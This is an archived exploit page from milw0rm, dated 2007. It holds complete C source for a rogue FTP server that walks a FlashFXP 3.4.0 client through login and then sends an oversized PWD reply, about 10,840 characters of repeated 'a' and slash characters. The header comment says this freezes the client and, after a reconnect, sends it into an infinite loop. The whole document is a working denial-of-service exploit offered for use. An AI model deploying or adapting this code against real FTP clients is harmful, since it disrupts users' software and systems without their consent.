<html><head><title>FlashFXP 3.4.0 build 1145 Remote Buffer Overflow DoS Exploit</title></head><pre>/***************************************************************************
*           FlashFXP V 3.4.0 build 1145 Buffer Overflow DoS                *
*                                                                          *
*                                                                          *
* There's a strange bug in FlashFXP.                                       *
* When sending a long PWD command with more than 5420 \ separated by at    *
* least one different char, it is possible to make the app unstable.       *
* It will first freeze during 45s consuming 100% resources, and then, if   *
* the user hits disconnect and then reconnects to the server it will enter *
* in an infinite loop trying to put data on the stack.                     *
*                                                                          *
*                                                                          *
* I admit it is a little bit tricky but maybe someone will find a better   *
* way to exploit this vuln.                                                *
*                                                                          *
* Have Fun!                                                                *
*                                                                          *
* Coded by Marsu &lt;Marsupilamipowa@hotmail.fr&gt;                              *
***************************************************************************/



#include &quot;winsock2.h&quot;
#include &quot;stdio.h&quot;
#include &quot;stdlib.h&quot;
#include &quot;windows.h&quot;
#pragma comment(lib, &quot;ws2_32.lib&quot;)

int main(int argc, char* argv[])
{
	char recvbuff[1024];
	char evilbuff[11000];
	sockaddr_in sin;
	int server,client;
	WSADATA wsaData;
	WSAStartup(MAKEWORD(1,1), &amp;wsaData);

	int n=1;
	while (n&lt;=2)
	{
		server = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		sin.sin_family = PF_INET;
		sin.sin_addr.s_addr = htonl(INADDR_ANY);
		sin.sin_port = htons( 21 );
		bind(server,(SOCKADDR*)&amp;sin,sizeof(sin));
		printf(&quot;[*] Listening on port 21...\n&quot;);
		listen(server,5);
		printf(&quot;[*] Waiting for client ...\n&quot;);
		client=accept(server,NULL,NULL);
		printf(&quot;[+] Client connected\n&quot;);


		memcpy(evilbuff,&quot;220 Hello there\r\n\0&quot;,18);
		memset(recvbuff,'\0',1024);

		if (send(client,evilbuff,strlen(evilbuff),0)==-1)
		{
			printf(&quot;[-] Error in send!\n&quot;);
			exit(-1);
		}

		//USER
		recv(client,recvbuff,1024,0);
		printf(&quot;%s&quot;, recvbuff);
		memcpy(evilbuff,&quot;331 \r\n\0&quot;,7);
		send(client,evilbuff,strlen(evilbuff),0);
		Sleep(50);

		//PASS
		recv(client,recvbuff,1024,0);
		printf(&quot;%s&quot;, recvbuff);
		memcpy(evilbuff,&quot;230 \r\n\0&quot;,7);
		send(client,evilbuff,strlen(evilbuff),0);

		//SYST
		memset(recvbuff,'\0',1024);
		recv(client,recvbuff,1024,0);
		printf(&quot;%s&quot;, recvbuff);
		memcpy(evilbuff,&quot;215 WINDOWS\r\n\0&quot;,14);
		send(client,evilbuff,strlen(evilbuff),0);

		//FEAT
		recv(client,recvbuff,1024,0);
		printf(&quot;%s&quot;, recvbuff);
		memcpy(evilbuff,&quot;211 END\r\n\0&quot;,10);
		send(client,evilbuff,strlen(evilbuff),0);

		//PWD
		int i=5;
		recv(client,recvbuff,1024,0);
		printf(&quot;%s&quot;, recvbuff);
		while (i&lt;10840) {
			memset(evilbuff+i,'a',1);
			i++;
			memset(evilbuff+i,'//',1);
			i++;
		}
		memcpy(evilbuff,&quot;257 \&quot;&quot;,5);
		memcpy(evilbuff+10840,&quot;\&quot;\r\n\0&quot;,4);
		send(client,evilbuff,strlen(evilbuff),0);
		closesocket(client);
		closesocket(server);
		client=server=NULL;

		if (n&lt;2) {
			printf(&quot;[+] Now FlashFXP is out for 45sec.\n&quot;);
			printf(&quot;[+] Note that user MUST click on disconnect and then reconnect\n  
   to trigger the bug.\n\n&quot;);
		}
		n++;
	}
	Sleep(2000);
	printf(&quot;\n[+] FlashFXP must be DoSed\n&quot;);
	return 0;
}

// milw0rm.com [2007-02-06]</pre></html>